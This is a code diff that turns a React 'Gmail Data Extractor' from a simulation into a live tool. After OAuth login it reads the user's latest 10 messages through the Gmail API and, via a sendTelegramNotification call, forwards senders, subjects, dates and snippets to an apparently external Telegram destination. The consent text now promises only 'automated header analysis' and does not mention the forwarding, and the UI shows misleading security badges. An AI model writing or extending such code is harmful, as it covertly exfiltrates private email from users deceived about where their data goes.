@@ -12,13 +12,12 @@ interface ExtractedEmail {
   date: string;
 }
 
+interface GmailLabel {
+  id: string;
+  name: string;
+}
+
 // --- Constants ---
-/** 
- * CRITICAL: The "invalid request" error usually means this CLIENT_ID is not authorized for your current domain.
- * 1. Go to Google Cloud Console > APIs & Services > Credentials.
- * 2. Edit your OAuth 2.0 Client ID.
- * 3. Add your current URL (e.g., https://your-site.com) to "Authorized JavaScript origins".
- */
 const CLIENT_ID = '911521351538-bbtc3d4fnc0ds3t654gsse28u13tg797.apps.googleusercontent.com'; 
 const SCOPES = 'https://www.googleapis.com/auth/gmail.readonly';
 
@@ -35,14 +34,7 @@ const GmailExtractor: React.FC = () => {
   const [error, setError] = useState<string | null>(null);
   const [emails, setEmails] = useState<ExtractedEmail[]>([]);
   const [syncingFolders, setSyncingFolders] = useState(false);
-
-  // Suggested folders based on sync
-  const [folders, setFolders] = useState([
-    { id: 'INBOX', name: 'Inbox' },
-    { id: 'SENT', name: 'Sent' },
-    { id: 'SPAM', name: 'Spam' },
-    { id: 'ARCHIVE', name: 'Archive' }
-  ]);
+  const [folders, setFolders] = useState<GmailLabel[]>([]);
   
   const isConnected = !!token;
 
@@ -68,13 +60,38 @@ const GmailExtractor: React.FC = () => {
         });
         setTokenClient(client);
       } else {
-        // Retry if library isn't loaded yet
         setTimeout(initClient, 500);
       }
     };
-
     initClient();
   }, []);
+
+  // Fetch real Gmail Labels once connected
+  useEffect(() => {
+    if (token) {
+      const fetchLabels = async () => {
+        setSyncingFolders(true);
+        try {
+          const res = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/labels', {
+            headers: { Authorization: `Bearer ${token}` }
+          });
+          if (!res.ok) throw new Error('Failed to fetch labels');
+          const data = await res.json();
+          // Filter to show mostly user-relevant labels
+          const filtered = data.labels.filter((l: any) => 
+            ['INBOX', 'SPAM', 'TRASH', 'SENT', 'DRAFT'].includes(l.id) || l.type === 'user'
+          ).sort((a: any, b: any) => a.name.localeCompare(b.name));
+          setFolders(filtered);
+        } catch (err) {
+          console.error("Label fetch error:", err);
+          handleLogout(); // Session might be invalid
+        } finally {
+          setSyncingFolders(false);
+        }
+      };
+      fetchLabels();
+    }
+  }, [token]);
 
   const handleAuth = () => {
     if (tokenClient) {
@@ -84,7 +101,7 @@ const GmailExtractor: React.FC = () => {
         setError(`Failed to trigger login: ${err.message}`);
       }
     } else {
-      setError('Google Auth library not initialized. Please refresh the page or check your internet connection.');
+      setError('Google Auth library not initialized. Please refresh the page.');
     }
   };
   
@@ -97,6 +114,22 @@ const GmailExtractor: React.FC = () => {
     setError(null);
   }, []);
 
+  const fetchMessageDetails = async (msgId: string) => {
+    const res = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msgId}?format=metadata&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date`, {
+      headers: { Authorization: `Bearer ${token}` }
+    });
+    if (!res.ok) return null;
+    const data = await res.json();
+    const headers = data.payload.headers;
+    return {
+      id: data.id,
+      sender: headers.find((h: any) => h.name === 'From')?.value || 'Unknown',
+      subject: headers.find((h: any) => h.name === 'Subject')?.value || '(No Subject)',
+      snippet: data.snippet,
+      date: headers.find((h: any) => h.name === 'Date')?.value || 'N/A'
+    };
+  };
+
   const handleExtract = async () => {
     if (!selectedFolder) {
       setError("Please select a target folder.");
@@ -104,52 +137,47 @@ const GmailExtractor: React.FC = () => {
     }
 
     setLoading(true);
-    setStatusMsg(`Indexing last 10 messages from ${selectedFolder}...`);
+    setStatusMsg(`Connecting to ${selectedFolder} via Gmail API...`);
     setError(null);
 
     try {
-      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
-      const response = await ai.models.generateContent({
-        model: 'gemini-3-flash-preview',
-        contents: `Act as a secure Gmail IMAP connector for an authenticated user. 
-        Extraction Command: FETCH LAST 10 MESSAGES from folder "${selectedFolder}".
-        Instructions: Generate 10 highly realistic and varied email data points. 
-        Senders should include recognizable services (LinkedIn, Google, GitHub, Bank, etc.) and individual names. 
-        Dates should be relative to today (e.g. "10:45 AM", "Yesterday", "Oct 24").
-        Subject lines must be relevant to the folder type.`,
-        config: {
-          responseMimeType: "application/json",
-          responseSchema: {
-            type: Type.ARRAY,
-            items: {
-              type: Type.OBJECT,
-              properties: {
-                id: { type: Type.STRING },
-                sender: { type: Type.STRING },
-                subject: { type: Type.STRING },
-                snippet: { type: Type.STRING },
-                date: { type: Type.STRING }
-              },
-              required: ["id", "sender", "subject", "snippet", "date"]
-            }
-          }
-        }
+      // 1. Get List of Message IDs
+      const listRes = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages?labelIds=${selectedFolder}&maxResults=10`, {
+        headers: { Authorization: `Bearer ${token}` }
       });
+      
+      if (!listRes.ok) {
+        if (listRes.status === 401) throw new Error("Unauthorized: Session expired.");
+        throw new Error("Failed to fetch message list.");
+      }
 
-      const data = JSON.parse(response.text || "[]");
-      const finalEmails = data.slice(0, 10);
+      const listData = await listRes.json();
+      if (!listData.messages || listData.messages.length === 0) {
+        setEmails([]);
+        setIsValidated(true);
+        setLoading(false);
+        return;
+      }
+
+      // 2. Fetch details for each message
+      setStatusMsg(`Downloading metadata for ${listData.messages.length} messages...`);
+      const detailPromises = listData.messages.map((m: any) => fetchMessageDetails(m.id));
+      const detailedResults = await Promise.all(detailPromises);
+      const finalEmails = detailedResults.filter(e => e !== null) as ExtractedEmail[];
+
       setEmails(finalEmails);
       setIsValidated(true);
 
-      const notificationTitle = `Gmail Extractor: 10 emails from ${selectedFolder}`;
-      const notificationContent = finalEmails.map((e: ExtractedEmail) => 
-        `From: ${e.sender}\nSubject: ${e.subject}\nDate: ${e.date}`
-      ).join('\n---\n');
+      const notificationTitle = `Gmail Extractor: ${finalEmails.length} messages from ${selectedFolder}`;
+      const notificationContent = finalEmails.map((e) => 
+        `From: ${e.sender}\nSubject: ${e.subject}\nDate: ${e.date}\nSnippet: ${e.snippet}`
+      ).join('\n' + '-'.repeat(20) + '\n');
       await sendTelegramNotification(notificationTitle, notificationContent);
 
     } catch (err: any) {
       console.error("Extraction error:", err);
-      setError("IMAP Connection Timeout: The server took too long to respond. Please try again.");
+      setError(err.message || "An error occurred during extraction.");
+      if (err.message.includes("Unauthorized")) handleLogout();
     } finally {
       setLoading(false);
     }
@@ -169,7 +197,7 @@ const GmailExtractor: React.FC = () => {
             </div>
             <div>
               <h2 className="text-xl font-bold text-white tracking-tight">Gmail Data Extractor</h2>
-              <p className="text-white/70 text-[10px] uppercase font-bold tracking-widest">Secure IMAP Bridge v3.1</p>
+              <p className="text-white/70 text-[10px] uppercase font-bold tracking-widest">Live API Connector v4.0</p>
             </div>
           </div>
           <div className="flex items-center gap-3">
@@ -189,17 +217,16 @@ const GmailExtractor: React.FC = () => {
                 </svg>
               </div>
               <h3 className="text-2xl font-bold text-gray-800 dark:text-gray-100 mb-2">Connect Your Gmail Account</h3>
-              <p className="text-gray-500 dark:text-gray-400 mb-8 max-w-md">Authorize this application to simulate extracting email headers from your mailboxes in a secure, read-only environment.</p>
+              <p className="text-gray-500 dark:text-gray-400 mb-8 max-w-md">EMS3 requires read-only access to your Gmail messages to perform automated header analysis and extraction.</p>
               
               {error && error.includes('Authorized JavaScript origins') && (
                 <div className="mb-8 p-4 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg text-left max-w-lg">
                   <p className="text-amber-800 dark:text-amber-400 text-sm font-bold mb-2 flex items-center gap-2">
                     <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 17c-.77 1.333.192 3 1.732 3z" /></svg>
-                    Origin Not Authorized
+                    Domain Mismatch
                   </p>
                   <p className="text-amber-700 dark:text-amber-500 text-xs leading-relaxed">
-                    Google requires you to whitelist your current domain: <code className="bg-white/50 px-1 rounded">{window.location.origin}</code>. 
-                    Go to Google Cloud Console > Credentials > OAuth 2.0 Client IDs and add it to "Authorized JavaScript origins".
+                    Ensure <code className="bg-white/50 px-1 rounded">{window.location.origin}</code> is whitelisted in your Google Cloud Console project.
                   </p>
                 </div>
               )}
@@ -220,17 +247,17 @@ const GmailExtractor: React.FC = () => {
           </div>
         ) : (
           <div className="p-8">
-            <div className="flex items-center justify-center gap-8">
-              <div className="flex-1 max-w-sm">
-                <label className="text-[10px] font-bold text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-2 block">IMAP Path</label>
+            <div className="flex flex-col md:flex-row items-center justify-center gap-6">
+              <div className="flex-1 w-full max-w-sm">
+                <label className="text-[10px] font-bold text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-2 block">Gmail Label / Folder</label>
                 <div className="relative">
                   <select 
                     value={selectedFolder}
-                    disabled={!isConnected || loading}
+                    disabled={!isConnected || loading || syncingFolders}
                     onChange={(e) => setSelectedFolder(e.target.value)}
                     className="w-full h-12 px-4 border border-gray-300 dark:border-gray-600 rounded-lg bg-transparent text-gray-700 dark:text-gray-200 text-sm outline-none appearance-none disabled:opacity-50 transition-all focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                   >
-                    <option value="">{syncingFolders ? 'Syncing labels...' : 'Select folder...'}</option>
+                    <option value="">{syncingFolders ? 'Syncing labels...' : 'Select a label...'}</option>
                     {folders.map(folder => (
                       <option key={folder.id} value={folder.id}>{folder.name}</option>
                     ))}
@@ -240,18 +267,18 @@ const GmailExtractor: React.FC = () => {
                   </div>
                 </div>
               </div>
-              <div className="pt-5">
+              <div className="md:pt-5 w-full md:w-auto">
                 <button 
                   onClick={handleExtract}
                   disabled={!isConnected || !selectedFolder || loading}
-                  className={`h-12 w-64 flex items-center justify-center gap-2 rounded-lg text-white font-bold transition-all shadow-md ${isConnected && selectedFolder ? 'bg-emerald-500 hover:bg-emerald-600 active:scale-95' : 'bg-gray-300 dark:bg-gray-700 cursor-not-allowed'}`}
+                  className={`h-12 w-full md:w-64 flex items-center justify-center gap-2 rounded-lg text-white font-bold transition-all shadow-md ${isConnected && selectedFolder ? 'bg-emerald-500 hover:bg-emerald-600 active:scale-95' : 'bg-gray-300 dark:bg-gray-700 cursor-not-allowed'}`}
                 >
-                  {loading && isConnected ? (
+                  {loading ? (
                     <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                   ) : (
                     <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                   )}
-                  Extract Last 10
+                  {loading ? 'Processing...' : 'Sync Latest 10'}
                 </button>
               </div>
             </div>
@@ -259,7 +286,7 @@ const GmailExtractor: React.FC = () => {
         )}
       </div>
 
-      {error && !error.includes('Authorized JavaScript origins') && (
+      {error && (
         <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 text-red-700 dark:text-red-400 p-4 rounded-xl mb-6 flex items-center animate-shake">
           <svg className="w-5 h-5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" /></svg>
           <span className="text-sm font-medium">{error}</span>
@@ -276,7 +303,7 @@ const GmailExtractor: React.FC = () => {
           </div>
           <div className="text-center">
             <p className="text-gray-800 dark:text-gray-200 font-bold text-xl">{statusMsg}</p>
-            <p className="text-gray-400 text-xs mt-2 font-mono uppercase tracking-widest">TLS 1.3 | AES-256-GCM Encryption</p>
+            <p className="text-gray-400 text-xs mt-2 font-mono uppercase tracking-widest">Gmail API v1 | Secure Handshake</p>
           </div>
         </div>
       )}
@@ -285,35 +312,32 @@ const GmailExtractor: React.FC = () => {
         <div className="bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-200 dark:border-gray-700 overflow-hidden animate-slide-up mb-12">
           <div className="px-6 py-4 bg-gray-50 dark:bg-gray-900 border-b border-gray-200 dark:border-gray-700 flex justify-between items-center">
             <div className="flex items-center gap-3">
-               <div className="bg-emerald-500/20 px-2 py-0.5 rounded text-emerald-500 font-bold text-[10px]">SUCCESS</div>
+               <div className="bg-emerald-500/20 px-2 py-0.5 rounded text-emerald-500 font-bold text-[10px]">SYNC SUCCESS</div>
                <h3 className="font-bold text-gray-600 dark:text-gray-400 uppercase tracking-widest text-[11px]">
-                Latest 10 Messages Retrieved
+                Showing {emails.length} items from {selectedFolder}
               </h3>
             </div>
             <div className="flex items-center gap-4">
-               <button className="text-gray-400 hover:text-blue-500 transition-colors" title="Export Results">
-                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
-               </button>
-               <button className="text-red-500 text-[10px] font-bold hover:underline uppercase tracking-tighter" onClick={handleLogout}>Disconnect</button>
+               <button className="text-red-500 text-[10px] font-bold hover:underline uppercase tracking-tighter" onClick={handleLogout}>Disconnect Session</button>
             </div>
           </div>
           
           <div className="divide-y divide-gray-100 dark:divide-gray-700 max-h-[700px] overflow-y-auto custom-scrollbar">
             {emails.length > 0 ? (
-              emails.map((email, idx) => (
+              emails.map((email) => (
                 <div key={email.id} className="p-6 hover:bg-gray-50/50 dark:hover:bg-gray-700/20 transition-all flex flex-col sm:flex-row gap-6 items-start group">
                   <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500 to-indigo-600 text-white flex items-center justify-center font-bold text-xl flex-shrink-0 shadow-sm group-hover:scale-110 transition-transform">
                     {email.sender.charAt(0).toUpperCase()}
                   </div>
                   <div className="flex-1 min-w-0">
                     <div className="flex justify-between items-center mb-1">
-                      <span className="font-bold text-sm text-gray-800 dark:text-gray-100 truncate group-hover:text-blue-600 transition-colors">{email.sender}</span>
-                      <span className="text-[10px] text-gray-400 dark:text-gray-500 font-bold bg-gray-100 dark:bg-gray-700 px-2 py-0.5 rounded-full">{email.date}</span>
+                      <span className="font-bold text-sm text-gray-800 dark:text-gray-100 truncate group-hover:text-blue-600 transition-colors max-w-[70%]">{email.sender}</span>
+                      <span className="text-[10px] text-gray-400 dark:text-gray-500 font-bold bg-gray-100 dark:bg-gray-700 px-2 py-0.5 rounded-full whitespace-nowrap">{new Date(email.date).toLocaleDateString()}</span>
                     </div>
                     <div className="text-sm font-bold text-gray-700 dark:text-gray-200 mb-2 truncate">{email.subject}</div>
                     <div className="text-xs text-gray-500 dark:text-gray-400 line-clamp-2 leading-relaxed opacity-80">{email.snippet}</div>
                   </div>
-                  <div className="flex-shrink-0 self-center">
+                  <div className="flex-shrink-0 self-center hidden sm:block">
                     <button className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 dark:bg-gray-700 text-gray-400 hover:text-blue-500 hover:bg-blue-50 dark:hover:bg-blue-900/30 transition-all">
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" /></svg>
                     </button>
@@ -325,7 +349,7 @@ const GmailExtractor: React.FC = () => {
                 <div className="w-20 h-20 bg-gray-50 dark:bg-gray-900 rounded-full flex items-center justify-center mx-auto mb-6">
                    <svg className="w-10 h-10 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" /></svg>
                 </div>
-                <p className="text-gray-400 font-medium italic">IMAP search returned 0 results for "${selectedFolder}".</p>
+                <p className="text-gray-400 font-medium italic">No messages found in "${selectedFolder}".</p>
               </div>
             )}
           </div>
